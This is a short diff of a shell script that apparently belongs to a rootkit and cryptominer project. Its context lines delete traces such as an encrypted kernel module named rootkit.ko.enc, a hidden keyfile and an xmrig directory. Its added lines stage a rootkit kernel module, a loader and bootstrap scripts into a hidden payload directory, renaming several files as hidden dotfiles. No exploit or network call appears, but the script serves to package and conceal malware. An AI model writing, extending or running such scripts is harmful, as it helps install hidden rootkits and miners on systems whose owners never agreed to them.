@@ -10,3 +10,10 @@ rm /sbin/bootstrap_script.sh
 rm /boot/.keyfile.bin
 rm /lib/modules/$(uname -r)/extra/rootkit.ko.enc
 rm /opt/.xmrig/*
+
+mkdir payload/.build
+cp src/Makefile payload/.build
+cp src/rootkit.ko payload/.build
+cp loader_script payload/loader_script
+cp bootstrap_script.sh payload/.bootstrap_script.sh
+cp script_rootkit payload/.script_rootkit.sh
